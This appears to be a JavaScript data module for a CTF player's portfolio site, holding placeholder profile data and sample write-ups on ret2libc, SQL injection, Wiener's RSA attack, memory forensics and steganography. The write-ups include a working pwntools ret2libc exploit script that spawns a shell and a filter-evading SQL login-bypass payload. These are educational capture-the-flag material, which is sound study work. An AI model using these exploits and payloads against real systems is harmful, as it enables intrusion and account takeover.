export async function getPosts() {
	const response = await fetch('http://localhost:3000/writeups');
	return response;
}

export async function getProfile() {
	const response = await fetch('http://localhost:3000/profile');
	return response;
}

export async function getAchievements() {
	const response = await fetch('http://localhost:3000/achievements');
	return response;
}

export async function getSkills() {
	const response = await fetch('http://localhost:3000/skills');
	return response;
}

export async function getProjects() {
	const response = await fetch('http://localhost:3000/projects');
	return response;
}

export const PROFILE = {
	name: 'your_handle',
	fullName: 'Your Name',
	bio: 'Security researcher & CTF player. I break things for fun and document how.',
	github: 'https://github.com/yourhandle',
	twitter: 'https://twitter.com/yourhandle',
	avatar: null, // set to an image URL or import
	ctftime: 'https://ctftime.org/user/000000',
	followers: 128,
	team: 'Team Name',
};

export const POSTS = [
	{
		id: 1,
		slug: 'ret2libc-writeup',
		title: 'HTB – ret2libc: Bypassing NX with libc leaks',
		excerpt:
			'Classic stack buffer overflow on a 64-bit binary with NX enabled. We abuse puts() to leak a libc address and pivot to a shell.',
		date: '2025-05-20',
		category: 'pwn',
		difficulty: 'medium',
		ctf: 'HackTheBox',
		points: 300,
		body: `## Overview

This challenge gives us a 64-bit ELF with **NX** and **partial RELRO** enabled. No stack canary, which makes our life easier.

\`\`\`
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE
\`\`\`

## Finding the vulnerability

Running \`checksec\` confirms NX, so we can't execute shellcode directly. Instead, we'll use **ret2libc**: call \`puts(puts@got)\` to leak the real libc address, then calculate \`system\` and \`/bin/sh\` offsets.

\`\`\`python
from pwn import *

elf  = ELF('./vuln')
libc = ELF('./libc.so.6')
rop  = ROP(elf)

# gadgets
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret     = rop.find_gadget(['ret'])[0]

p = process('./vuln')

# Stage 1 – leak libc base
offset = 72  # found with cyclic
payload  = b'A' * offset
payload += p64(ret)          # stack-align for movaps
payload += p64(pop_rdi)
payload += p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(elf.sym['main'])  # loop back

p.sendline(payload)
p.recvuntil(b'\\n')
leak      = u64(p.recvline().strip().ljust(8, b'\\x00'))
libc.address = leak - libc.sym['puts']
log.success(f'libc base: {hex(libc.address)}')
\`\`\`

## Getting a shell

With the base address leaked, the second payload calls \`system("/bin/sh")\`:

\`\`\`python
# Stage 2 – call system("/bin/sh")
payload2  = b'A' * offset
payload2 += p64(ret)
payload2 += p64(pop_rdi)
payload2 += p64(next(libc.search(b'/bin/sh')))
payload2 += p64(libc.sym['system'])

p.sendline(payload2)
p.interactive()
\`\`\`

## Flag

\`\`\`
HTB{r3t2l1bc_1s_cl4ss1c}
\`\`\`
`,
	},
	{
		id: 2,
		slug: 'sql-injection-login',
		title: 'PicoCTF – Web Gauntlet: Blind SQLi Authentication Bypass',
		excerpt:
			'Classic login bypass via SQL injection with restricted keywords. We explore filter evasion and extract the admin credential.',
		date: '2025-05-14',
		category: 'web',
		difficulty: 'easy',
		ctf: 'PicoCTF',
		points: 200,
		body: `## Challenge description

A login page with an SQLite backend. The words \`OR\`, \`UNION\`, and \`SELECT\` are filtered, but we can still bypass authentication.

## Analysis

Input: \`admin' --\` → rejected. Let's try case variations:

\`\`\`sql
admin'/**/Or/**/'1'='1
\`\`\`

This works because the filter is case-sensitive!

## Flag

\`\`\`
picoCTF{y0u_4r3_th3_m4st3r_0f_sql}
\`\`\`
`,
	},
	{
		id: 3,
		slug: 'rsa-wiener-attack',
		title: "Crypto – Small Private Exponent: Wiener's Attack",
		excerpt:
			"RSA with a suspiciously small private exponent d. We apply Wiener's continued fraction attack to recover d and decrypt the flag.",
		date: '2025-05-07',
		category: 'crypto',
		difficulty: 'hard',
		ctf: 'PlaidCTF',
		points: 450,
		body: `## Challenge

We're given \`n\` and \`e\` where \`e\` is very large relative to \`n\`. This hints at a small \`d\`.

## Wiener's Attack

Wiener's theorem states: if \`d < n^(1/4)/3\`, the private key can be recovered via continued fractions of \`e/n\`.

\`\`\`python
from fractions import Fraction
import gmpy2

def wiener(e, n):
    cf = continued_fraction(Fraction(e, n))
    for i in range(len(cf)):
        k, d = convergent(cf[:i])
        if k == 0:
            continue
        phi = (e * d - 1) // k
        # check if phi factors n correctly
        b = n - phi + 1
        disc = b*b - 4*n
        if disc >= 0:
            sq, exact = gmpy2.isqrt_rem(disc)
            if exact == 0:
                p = (-b + int(sq)) // (-2)
                q = (-b - int(sq)) // (-2)
                if p * q == n:
                    return d
    return None
\`\`\`

## Flag

\`\`\`
PCTF{w13n3r_w4s_r1ght_4ll_4l0ng}
\`\`\`
`,
	},
	{
		id: 4,
		slug: 'ghidra-reverse-crackme',
		title: 'Reversing – CrackMe: Anti-debug & VM obfuscation with Ghidra',
		excerpt:
			'A packed Windows PE that detects debuggers and runs a tiny VM. We patch the anti-debug check and emulate the VM bytecode.',
		date: '2025-04-30',
		category: 'rev',
		difficulty: 'hard',
		ctf: 'RealWorldCTF',
		points: 500,
		body: `## Summary

Full reversing write-up coming soon.

## Flag

\`\`\`
rwctf{vm_0bfu5c4t10n_1s_fun}
\`\`\`
`,
	},
	{
		id: 5,
		slug: 'memory-forensics-volatility',
		title: 'Forensics – DumpIt: Memory analysis with Volatility 3',
		excerpt:
			'A Windows memory dump hides the flag in a running process. We use Volatility 3 to list processes, dump strings, and carve the flag.',
		date: '2025-04-22',
		category: 'forensics',
		difficulty: 'medium',
		ctf: 'NahamCon',
		points: 350,
		body: `## Tools

- Volatility 3
- strings
- grep

## Process

\`\`\`bash
vol -f dump.mem windows.pslist
vol -f dump.mem windows.cmdline
vol -f dump.mem windows.dumpfiles --pid 1337
strings -el dump_1337.bin | grep -i "nahcon{"
\`\`\`

## Flag

\`\`\`
nahcon{m3m0ry_d0n7_l13}
\`\`\`
`,
	},
	{
		id: 6,
		slug: 'misc-stego-png',
		title: 'Misc – Steg0saurus: LSB steganography in PNG',
		excerpt:
			'A PNG image hides data in the least significant bits. We extract it with zsteg and decode the hidden message.',
		date: '2025-04-15',
		category: 'misc',
		difficulty: 'easy',
		ctf: 'CTFZone',
		points: 100,
		body: `## Solution

\`\`\`bash
zsteg -a challenge.png | grep -i "ctf"
\`\`\`

Hidden data found in \`b1,rgb,lsb,xy\`.

## Flag

\`\`\`
CTFZone{l5b_15_n0t_5ecure}
\`\`\`
`,
	},
];

export const PROJECTS = [
	{
		id: 1,
		name: 'pwn-toolkit',
		description:
			'A collection of Python helpers built on top of pwntools — auto-detects binary architecture, leaks libc, and scaffolds ROP chains automatically.',
		tags: ['Python', 'pwntools', 'Binary Exploitation'],
		github: 'https://github.com',
		stars: 142,
		lang: 'Python',
	},
	{
		id: 2,
		name: 'ctf-writeups',
		description:
			'All my CTF write-ups in markdown format, organised by event, category, and difficulty. Includes solve scripts.',
		tags: ['CTF', 'Documentation', 'Security'],
		github: 'https://github.com',
		stars: 87,
		lang: 'Markdown',
	},
	{
		id: 3,
		name: 'fuzzer-lite',
		description:
			'Lightweight coverage-guided fuzzer targeting C/C++ CLI programs. Uses AFL-style instrumentation via compile-time hooks.',
		tags: ['C', 'Fuzzing', 'Security Research'],
		github: 'https://github.com',
		stars: 64,
		lang: 'C',
	},
	{
		id: 4,
		name: 'web-recon-suite',
		description:
			'Automated web reconnaissance tool: subdomain enumeration, parameter discovery, JS endpoint extraction, and screenshot capture.',
		tags: ['Go', 'Recon', 'Bug Bounty'],
		github: 'https://github.com',
		stars: 213,
		lang: 'Go',
	},
];

export const SKILLS = [
	{ label: 'Binary Exploitation', level: 90 },
	{ label: 'Reverse Engineering', level: 80 },
	{ label: 'Web Security', level: 85 },
	{ label: 'Cryptography', level: 70 },
	{ label: 'Forensics & OSINT', level: 75 },
	{ label: 'Malware Analysis', level: 65 },
];

export const ACHIEVEMENTS = [
	{ event: 'HTB University CTF 2024', placement: '12th / 800+', year: 2024 },
	{ event: 'PlaidCTF 2024', placement: '45th / 600+', year: 2024 },
	{ event: 'NahamCon CTF 2024', placement: '8th / 1200+', year: 2024 },
	{ event: 'PicoCTF 2024', placement: '3rd / 9000+', year: 2024 },
];
